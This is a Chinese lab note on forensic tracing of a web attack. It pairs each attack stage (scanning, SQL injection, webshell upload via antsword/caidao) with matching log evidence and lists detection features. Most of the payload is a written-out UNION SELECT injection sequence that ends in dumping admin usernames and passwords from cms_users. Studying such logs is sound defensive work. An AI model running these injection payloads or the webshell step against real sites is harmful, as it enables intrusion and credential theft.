## Task

- 具体化攻击流程
- 一一对应日志记录和攻击行为

## 具体化攻击流程

![image-20200606192504274](https://picturefac.oss-cn-hangzhou.aliyuncs.com/img/20200606192504.png)

![image-20200606191359924](https://picturefac.oss-cn-hangzhou.aliyuncs.com/img/20200606191400.png)

信息收集（扫描器）：

![image-20200607140002087](https://picturefac.oss-cn-hangzhou.aliyuncs.com/img/20200607140002.png)

找到漏洞页面，进行注入：

```
http://ip/cms/show.php?id=38
http://ip/cms/show.php?id=38/
http://ip/cms/show.php?id=38-0
http://ip/cms/show.php?id=38 order by 14
http://ip/cms/show.php?id=38 order by 16
http://ip/cms/show.php?id=38 order by 15
http://ip/cms/show.php?id=38 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
http://ip/cms/show.php?id=-38 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
http://ip/cms/show.php?id=-38 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,database(),15
http://ip/cms/show.php?id=-38 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,group_concat(table_name),15 from information_schema.tables where table_scheme='cms'-+
http://ip/cms/show.php?id=-38 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,group_concat(column_name),15 from information_schema.columns where table_scheme='cms_users'-+
http://ip/cms/show.php?id=-38 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,group_concat(username,0x7e,password),15 from cms_users-+

```

找到管理员账号密码，后台上传文件，传一个大马之类的东西。通过antsword/菜刀等工具连接，得到shell

## 攻击溯源

扫描证据

![image-20200607160752222](https://picturefac.oss-cn-hangzhou.aliyuncs.com/img/20200607160752.png)

注入证据

![image-20200607160934351](https://picturefac.oss-cn-hangzhou.aliyuncs.com/img/20200607160934.png)

上传证据

![image-20200607161125451](https://picturefac.oss-cn-hangzhou.aliyuncs.com/img/20200607161125.png)

![image-20200607161200390](https://picturefac.oss-cn-hangzhou.aliyuncs.com/img/20200607161200.png)

## 分析特征

- 对于扫描来说，短时间内会进行大量的连接请求，**通常这些请求的响应以404为主**
- 对于注入来说，**应当注意sql语句的关键字**
- 对于文件上传来说，**应当注意上传目录名（upload/attachment）有没有可疑的文件后缀（php等）**



关联（事件内部/）

不只要局限于sql 抽象成方法论

